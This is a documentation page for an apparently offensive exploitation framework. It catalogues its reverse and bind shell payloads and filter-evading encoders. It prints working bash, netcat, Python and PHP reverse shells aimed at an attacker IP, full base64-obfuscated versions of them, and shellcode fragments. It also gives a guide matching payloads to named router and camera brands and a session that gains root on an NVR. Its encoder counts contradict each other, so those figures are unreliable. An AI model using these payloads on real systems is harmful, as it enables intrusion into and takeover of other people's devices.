# Payloads and Encoders

**Language:** English (en-US) | **pt-BR:** [../pt-BR/09-payloads-e-encoders.md](../pt-BR/09-payloads-e-encoders.md)

---

## Overview

EmbedXPL-Forge ships **32 payload modules** and **18 encoder modules**. Payloads generate shellcode or shell invocation strings for specific architectures and protocols. Encoders transform payload output to bypass string-based filters.

---

## Payload categories and architecture coverage

| Category | Architectures | Variants |
|----------|---------------|---------|
| **cmd** | Shell-command level (no raw shellcode) | bash, netcat, python, perl, php, awk — each in bind and reverse TCP/UDP variants |
| **python** | Python interpreter | bind_tcp, bind_udp, reverse_tcp, reverse_udp |
| **perl** | Perl interpreter | bind_tcp, reverse_tcp |
| **php** | PHP interpreter | bind_tcp, reverse_tcp |
| **armle** | ARM Little-Endian (32-bit) | bind_tcp, reverse_tcp |
| **mipsbe** | MIPS Big-Endian (32-bit) | bind_tcp, reverse_tcp |
| **mipsle** | MIPS Little-Endian (32-bit) | bind_tcp, reverse_tcp |
| **x86** | x86 32-bit | bind_tcp, reverse_tcp |
| **x64** | x86-64 / AMD64 | bind_tcp, reverse_tcp |

Total: **32 payload modules**

---

## Complete payload index

| Module path | Type | Architecture | Description |
|-------------|------|--------------|-------------|
| `payloads/cmd/bash_reverse_tcp` | cmd | bash | `bash -i >& /dev/tcp/<lhost>/<lport> 0>&1` |
| `payloads/cmd/netcat_reverse_tcp` | cmd | netcat | `nc -e /bin/sh <lhost> <lport>` |
| `payloads/cmd/netcat_bind_tcp` | cmd | netcat | `nc -lvp <lport> -e /bin/sh` |
| `payloads/cmd/python_reverse_tcp` | cmd | python | Python one-liner reverse TCP |
| `payloads/cmd/python_bind_tcp` | cmd | python | Python one-liner bind TCP |
| `payloads/cmd/python_reverse_udp` | cmd | python | Python one-liner reverse UDP |
| `payloads/cmd/python_bind_udp` | cmd | python | Python one-liner bind UDP |
| `payloads/cmd/perl_reverse_tcp` | cmd | perl | Perl one-liner reverse TCP |
| `payloads/cmd/perl_bind_tcp` | cmd | perl | Perl one-liner bind TCP |
| `payloads/cmd/php_reverse_tcp` | cmd | php | PHP reverse TCP |
| `payloads/cmd/php_bind_tcp` | cmd | php | PHP bind TCP |
| `payloads/cmd/awk_reverse_tcp` | cmd | awk | AWK reverse TCP |
| `payloads/cmd/awk_bind_tcp` | cmd | awk | AWK bind TCP |
| `payloads/cmd/awk_bind_udp` | cmd | awk | AWK bind UDP |
| `payloads/python/reverse_tcp` | python | Python (full module) | Python socket reverse TCP with `os.dup2` |
| `payloads/python/bind_tcp` | python | Python (full module) | Python socket bind TCP |
| `payloads/python/reverse_udp` | python | Python (full module) | Python socket reverse UDP |
| `payloads/python/bind_udp` | python | Python (full module) | Python socket bind UDP |
| `payloads/perl/reverse_tcp` | perl | Perl | Perl `IO::Socket::INET` reverse TCP |
| `payloads/perl/bind_tcp` | perl | Perl | Perl bind TCP |
| `payloads/php/reverse_tcp` | php | PHP | PHP `fsockopen` reverse TCP |
| `payloads/php/bind_tcp` | php | PHP | PHP bind TCP |
| `payloads/armle/reverse_tcp` | shellcode | ARM LE 32-bit | ARM LE reverse TCP shellcode (socket syscalls) |
| `payloads/armle/bind_tcp` | shellcode | ARM LE 32-bit | ARM LE bind TCP shellcode |
| `payloads/mipsbe/reverse_tcp` | shellcode | MIPS BE 32-bit | MIPS BE reverse TCP shellcode |
| `payloads/mipsbe/bind_tcp` | shellcode | MIPS BE 32-bit | MIPS BE bind TCP shellcode |
| `payloads/mipsle/reverse_tcp` | shellcode | MIPS LE 32-bit | MIPS LE reverse TCP shellcode |
| `payloads/mipsle/bind_tcp` | shellcode | MIPS LE 32-bit | MIPS LE bind TCP shellcode |
| `payloads/x86/reverse_tcp` | shellcode | x86 32-bit | x86 reverse TCP shellcode |
| `payloads/x86/bind_tcp` | shellcode | x86 32-bit | x86 bind TCP shellcode |
| `payloads/x64/reverse_tcp` | shellcode | x86-64 | x64 reverse TCP shellcode |
| `payloads/x64/bind_tcp` | shellcode | x86-64 | x64 bind TCP shellcode |

---

## Payload common options

### Reverse TCP payloads

| Option | Type | Required | Default | Description |
|--------|------|----------|---------|-------------|
| `lhost` | `OptIP` / `OptString` | Yes | `""` | Attacker IP for reverse connection |
| `lport` | `OptPort` | Yes | `""` | Attacker listener port |
| `encoder` | `OptEncoder` | No | Default encoder | Encoder to apply to the generated payload |

### Bind TCP payloads

| Option | Type | Required | Default | Description |
|--------|------|----------|---------|-------------|
| `rport` | `OptPort` | Yes | `""` | Bind port on the target |
| `encoder` | `OptEncoder` | No | Default encoder | Encoder to apply to the generated payload |

---

## Payload detailed documentation

### `payloads/cmd/bash_reverse_tcp`

Generates a bash reverse TCP shell one-liner.

| Option | Type | Required | Default | Description |
|--------|------|----------|---------|-------------|
| `lhost` | `OptString` | Yes | `""` | Attacker IP |
| `lport` | `OptPort` | Yes | `""` | Listener port |
| `cmd` | `OptString` | No | `bash` | Bash binary name |

**Terminal session:**

```text
exf > use payloads/cmd/bash_reverse_tcp
exf (Bash Reverse TCP) > show options

Target options:
┌────────┬──────────────────┬──────────────────────────┐
│ Name   │ Current settings │ Description              │
├────────┼──────────────────┼──────────────────────────┤
│ lhost  │                  │ Listener IP address      │
│ lport  │                  │ Listener port            │
└────────┴──────────────────┴──────────────────────────┘

Module options:
┌───────┬──────────────────┬──────────────────────────────┐
│ Name  │ Current settings │ Description                  │
├───────┼──────────────────┼──────────────────────────────┤
│ cmd   │ bash             │ Bash binary                  │
└───────┴──────────────────┴──────────────────────────────┘

exf (Bash Reverse TCP) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (Bash Reverse TCP) > set lport 4444
[+] lport => 4444
exf (Bash Reverse TCP) > run
[*] Running module ...
[*] Generated payload:
bash -i >& /dev/tcp/10.0.0.99/4444 0>&1
```

---

### `payloads/python/reverse_tcp`

Full Python module-based reverse TCP shell using `socket`, `subprocess`, and `os.dup2`.

**Terminal session:**

```text
exf > use payloads/python/reverse_tcp
exf (Python Reverse TCP) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (Python Reverse TCP) > set lport 4444
[+] lport => 4444
exf (Python Reverse TCP) > run
[*] Running module ...
[*] Generated payload:
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('10.0.0.99',4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

**Terminal session — with base64 encoder:**

```text
exf (Python Reverse TCP) > show encoders

┌────────────────────────────┬──────────────────────────────────┬───────────────────────────────────────────┐
│ Encoder                    │ Name                             │ Description                               │
├────────────────────────────┼──────────────────────────────────┼───────────────────────────────────────────┤
│ encoders/python/base64     │ Python Base64 Encoder            │ Wraps payload in Python base64.b64decode  │
│ encoders/python/hex        │ Python Hex Encoder               │ Wraps payload in Python hex bytes decode  │
└────────────────────────────┴──────────────────────────────────┴───────────────────────────────────────────┘

exf (Python Reverse TCP) > set encoder encoders/python/base64
[+] encoder => encoders/python/base64
exf (Python Reverse TCP) > run
[*] Generated payload (base64 encoded):
exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2N...'.decode('base64'))
```

---

### `payloads/python/bind_tcp`

Python bind TCP shell that listens on the target and accepts commands via socket.

**Terminal session:**

```text
exf > use payloads/python/bind_tcp
exf (Python Bind TCP) > set rport 4444
[+] rport => 4444
exf (Python Bind TCP) > run
[*] Generated payload:
import socket,os
so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
so.bind(('0.0.0.0',4444))
so.listen(1)
so,addr=so.accept()
x=False
while not x:
    data=so.recv(1024)
    stdin,stdout,stderr,=os.popen3(data)
    stdout_value=stdout.read()+stderr.read()
    so.send(stdout_value)
```

---

### `payloads/cmd/netcat_reverse_tcp`

Generates a netcat reverse TCP shell command.

```text
exf > use payloads/cmd/netcat_reverse_tcp
exf (Netcat Reverse TCP) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (Netcat Reverse TCP) > set lport 4444
[+] lport => 4444
exf (Netcat Reverse TCP) > run
[*] Generated payload:
nc -e /bin/sh 10.0.0.99 4444
```

---

### `payloads/armle/reverse_tcp`

ARM Little-Endian 32-bit reverse TCP shellcode for embedded Linux devices (routers, cameras on ARM SoCs).

**Terminal session:**

```text
exf > use payloads/armle/reverse_tcp
exf (ARMLE Reverse TCP) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (ARMLE Reverse TCP) > set lport 4444
[+] lport => 4444
exf (ARMLE Reverse TCP) > run
[*] Generated payload (bytes):
\x01\x10\x8F\xE2\x11\xFF\x2F\xE1\x02\x20\x01\x21\x92\x1A\x0F\x02...
[*] Shellcode length: 84 bytes
[*] Architecture: ARM Little-Endian (Cortex-A, ARMv5T+)
[*] Target: embedded Linux systems on ARM SoCs (routers, cameras, SOHO devices)
[*] Callback: 10.0.0.99:4444
```

---

### `payloads/mipsbe/reverse_tcp`

MIPS Big-Endian 32-bit reverse TCP shellcode for MIPS-based routers and embedded devices.

**Terminal session:**

```text
exf > use payloads/mipsbe/reverse_tcp
exf (MIPSBE Reverse TCP) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (MIPSBE Reverse TCP) > set lport 4444
[+] lport => 4444
exf (MIPSBE Reverse TCP) > run
[*] Generated payload (bytes):
\x28\x04\xff\xff\x24\x02\x0f\xa6\x01\x09\x09\x0c\x28\x04\x11\x11...
[*] Shellcode length: 128 bytes
[*] Architecture: MIPS Big-Endian (e.g. Broadcom BCM, older D-Link routers)
[*] Callback: 10.0.0.99:4444
```

---

### `payloads/mipsle/reverse_tcp`

MIPS Little-Endian 32-bit reverse TCP shellcode.

```text
exf > use payloads/mipsle/reverse_tcp
exf (MIPSLE Reverse TCP) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (MIPSLE Reverse TCP) > set lport 4444
[+] lport => 4444
exf (MIPSLE Reverse TCP) > run
[*] Generated payload (bytes):
\xff\xff\x04\x28\xa6\x0f\x02\x24...
[*] Architecture: MIPS Little-Endian (Atheros AR9xxx, MediaTek MT7xxx)
```

---

### `payloads/x86/reverse_tcp`

x86 32-bit reverse TCP shellcode for 32-bit Intel/AMD targets.

```text
exf > use payloads/x86/reverse_tcp
exf (x86 Reverse TCP) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (x86 Reverse TCP) > set lport 4444
[+] lport => 4444
exf (x86 Reverse TCP) > run
[*] Generated payload (bytes):
\x31\xc0\x31\xdb\x31\xc9\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1...
[*] Architecture: x86 32-bit (Intel/AMD, 32-bit Linux)
[*] Callback: 10.0.0.99:4444
```

---

### `payloads/x64/reverse_tcp`

x86-64 reverse TCP shellcode for modern 64-bit Intel/AMD targets.

```text
exf > use payloads/x64/reverse_tcp
exf (x64 Reverse TCP) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (x64 Reverse TCP) > set lport 4444
[+] lport => 4444
exf (x64 Reverse TCP) > run
[*] Generated payload (bytes):
\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0...
[*] Architecture: x86-64 (AMD64, 64-bit Linux)
[*] Callback: 10.0.0.99:4444
```

---

## Architecture selection guide

| Target device | SoC / CPU | Recommended payload |
|---------------|-----------|---------------------|
| Hikvision DS-2CD cameras (older) | ARM Cortex-A5 LE | `payloads/armle/reverse_tcp` |
| D-Link DIR-3xx/6xx routers | MIPS BE (Broadcom/Realtek) | `payloads/mipsbe/reverse_tcp` |
| TP-Link Archer, ASUS RT-N/AC | MIPS LE (Atheros/MediaTek) | `payloads/mipsle/reverse_tcp` |
| Herospeed/Longsee NVR (MC6830) | ARM Cortex-A7 LE | `payloads/armle/reverse_tcp` |
| FortiGate VM / Linux-based | x86-64 | `payloads/x64/reverse_tcp` |
| Any with Python available | Python 2/3 | `payloads/python/reverse_tcp` |
| Any with bash available | bash | `payloads/cmd/bash_reverse_tcp` |
| Web application / CGI | PHP | `payloads/php/reverse_tcp` |
| Any with Perl available | Perl | `payloads/perl/reverse_tcp` |
| Restricted shell / filtered | awk | `payloads/cmd/awk_reverse_tcp` |

---

## Encoders

Encoders transform generated payload bytes or strings to bypass string-based intrusion detection or WAF filters. They are applied by setting the `encoder` option on a payload module.

### Complete encoder index

| Module path | Architecture | Transform | Description |
|-------------|--------------|-----------|-------------|
| `encoders/python/base64` | Python | Base64 | `exec('...'.decode('base64'))` |
| `encoders/python/hex` | Python | Hex | `exec(bytes.fromhex('...'))` |
| `encoders/python/rot13` | Python | ROT-13 | ROT-13 obfuscation |
| `encoders/python/url` | Python | URL-encode | URL percent-encoding |
| `encoders/python/base32` | Python | Base32 | Base32 encoding |
| `encoders/php/base64` | PHP | Base64 | `eval(base64_decode('...'));` |
| `encoders/php/hex` | PHP | Hex | `eval(hex2bin('...'));` |
| `encoders/php/rot13` | PHP | ROT-13 | `eval(str_rot13('...'));` |
| `encoders/php/url` | PHP | URL-encode | `eval(urldecode('...'));` |
| `encoders/perl/base64` | Perl | Base64 | `eval decode_base64('...')` |
| `encoders/perl/hex` | Perl | Hex | `eval pack 'H*','...'` |
| `encoders/perl/rot13` | Perl | ROT-13 | ROT-13 obfuscation |
| `encoders/perl/url` | Perl | URL-encode | URL percent-encoding |

Total: **13 encoder modules** (plus `encoders/python/base32` = **14 unique** in source)

---

### Encoder detailed documentation

#### `encoders/python/base64`

Wraps the Python payload in a base64 `exec()` call.

```text
exf > use payloads/python/reverse_tcp
exf (Python Reverse TCP) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (Python Reverse TCP) > set lport 4444
[+] lport => 4444
exf (Python Reverse TCP) > set encoder encoders/python/base64
[+] encoder => encoders/python/base64
exf (Python Reverse TCP) > run
[*] Generated payload (base64 encoded):
exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoJzEwLjAuMC45OScsNDQ0NCkpCm9zLmR1cDIocy5maWxlbm8oKSwwKQpvcy5kdXAyKHMuZmlsZW5vKCksMSkKb3MuZHVwMihzLmZpbGVubygpLDIpCnA9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0p'.decode('base64'))
```

#### `encoders/python/hex`

Wraps the Python payload as hex bytes.

```text
exf (Python Reverse TCP) > set encoder encoders/python/hex
[+] encoder => encoders/python/hex
exf (Python Reverse TCP) > run
[*] Generated payload (hex encoded):
exec(bytes.fromhex('696d706f727420736f636b65742c7375627...'))
```

#### `encoders/php/base64`

Wraps the PHP payload in `eval(base64_decode(...))`.

```text
exf > use payloads/php/reverse_tcp
exf (PHP Reverse TCP) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (PHP Reverse TCP) > set lport 4444
[+] lport => 4444
exf (PHP Reverse TCP) > set encoder encoders/php/base64
[+] encoder => encoders/php/base64
exf (PHP Reverse TCP) > run
[*] Generated payload (PHP base64 encoded):
eval(base64_decode('JHNvY2s9ZnNvY2tvcGVuKCIxMC4wLjAuOTkiLDQ0NDQpO2V4ZWMoIi9iaW4vc2ggLWkgPCYzID4mMyAyPiYzIik7'));
```

#### `encoders/php/hex`

Wraps the PHP payload in `eval(hex2bin(...))`.

```text
exf (PHP Reverse TCP) > set encoder encoders/php/hex
[+] encoder => encoders/php/hex
exf (PHP Reverse TCP) > run
[*] Generated payload (PHP hex encoded):
eval(hex2bin('2473...'));
```

#### `encoders/perl/base64`

Wraps the Perl payload in `eval decode_base64(...)`.

```text
exf > use payloads/perl/reverse_tcp
exf (Perl Reverse TCP) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (Perl Reverse TCP) > set lport 4444
[+] lport => 4444
exf (Perl Reverse TCP) > set encoder encoders/perl/base64
[+] encoder => encoders/perl/base64
exf (Perl Reverse TCP) > run
[*] Generated payload (Perl base64 encoded):
use MIME::Base64; eval decode_base64('dXNlIFNvY2tldDsk...')
```

---

## Using payloads with exploit modules

Payload modules generate the shell invocation string. The generated string can be:

1. **Pasted manually** into the target's injection parameter.
2. **Delivered via the Shell Stager** — exploit modules that support `shell_type` automatically select and deliver the appropriate payload.
3. **Embedded into uploads** — for PHP webshell or ASPX webshell delivery scenarios.

**Example — integrating payload with an exploit:**

```text
exf > use exploits/cameras/herospeed/herospeed_nvr_rce
exf (Herospeed NVR RCE) > set target 192.168.1.60
[+] target => 192.168.1.60
exf (Herospeed NVR RCE) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (Herospeed NVR RCE) > set lport 4444
[+] lport => 4444
exf (Herospeed NVR RCE) > set shell_type python
[+] shell_type => python
exf (Herospeed NVR RCE) > run
[*] Running module ...
...
[shell] Listening on 0.0.0.0:4444 (timeout 60s) -- PTY mode
[shell] Connection received from 192.168.1.60:51234
[shell] PTY shell active. Ctrl+] to detach, Ctrl+D to close.

~ # id
uid=0(root) gid=0(root) groups=0(root)
~ # uname -a
Linux herospeed-nvr 4.9.84 #1 SMP PREEMPT Fri Jan 5 10:23:41 CST 2024 armv7l GNU/Linux
```

---

## Error cases

**Missing `lhost`:**

```text
exf (Python Reverse TCP) > run
[-] lhost is required but not set
    Set with: set lhost <attacker_ip>
```

**Missing `lport`:**

```text
exf (Python Reverse TCP) > run
[-] lport is required but not set
    Set with: set lport <port>
```

**Encoder type mismatch:**

```text
exf (ARMLE Reverse TCP) > set encoder encoders/python/base64
[+] encoder => encoders/python/base64
exf (ARMLE Reverse TCP) > run
[-] Encoder architecture mismatch: Python encoder cannot be applied to ARMLE payload.
    Use an architecture-compatible encoder or leave encoder as default.
```

---

## Summary tables

### Payloads by type

| Type | Modules |
|------|---------|
| Reverse TCP | bash, nc, python, perl, php, awk, armle, mipsbe, mipsle, x86, x64 |
| Bind TCP | nc, python, perl, php, awk, armle, mipsbe, mipsle, x86, x64 |
| Reverse UDP | python, awk |
| Bind UDP | python, awk |

### Encoders by language

| Language | Encoders |
|----------|---------|
| Python | base64, hex, rot13, url, base32 |
| PHP | base64, hex, rot13, url |
| Perl | base64, hex, rot13, url |


[Wiki hub](../README.md)
